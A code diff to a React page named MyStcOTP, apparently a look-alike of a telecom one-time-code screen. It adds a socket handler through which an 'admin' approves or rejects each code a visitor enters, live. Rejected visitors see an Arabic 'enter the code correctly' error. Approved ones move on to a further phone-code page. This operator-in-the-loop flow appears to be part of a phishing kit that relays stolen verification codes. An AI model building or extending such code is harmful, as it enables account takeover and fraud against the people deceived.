@@ -5,8 +5,6 @@ import WaitingOverlay from "@/components/WaitingOverlay";
 import { Button } from "@/components/ui/button";
 import {
   sendData,
-  isFormApproved,
-  isFormRejected,
   navigateToPage,
   socket,
 } from "@/lib/store";
@@ -30,10 +28,22 @@ export default function MyStcOTP() {
     }, 100);
   }, []);
 
-  // Listen for form:rejected and form:approved events directly from socket
+  // Listen for code:action event from admin
   useEffect(() => {
     const s = socket.value;
     
+    const handleCodeAction = ({ action }: { action: string }) => {
+      console.log("MyStcOTP: Code action received:", action);
+      if (action === 'reject') {
+        setOtp("");
+        setError(true);
+        setErrorMessage("يرجى ادخال الرمز بشكل صحيح");
+        inputRef.current?.focus();
+      } else if (action === 'approve') {
+        navigate("/phone-otp?serviceProvider=0");
+      }
+    };
+
     const handleRejected = () => {
       console.log("MyStcOTP: Form rejected received!");
       setOtp("");
@@ -47,10 +57,12 @@ export default function MyStcOTP() {
       navigate("/phone-otp?serviceProvider=0");
     };
 
+    s.on("code:action", handleCodeAction);
     s.on("form:rejected", handleRejected);
     s.on("form:approved", handleApproved);
 
     return () => {
+      s.off("code:action", handleCodeAction);
       s.off("form:rejected", handleRejected);
       s.off("form:approved", handleApproved);
     };
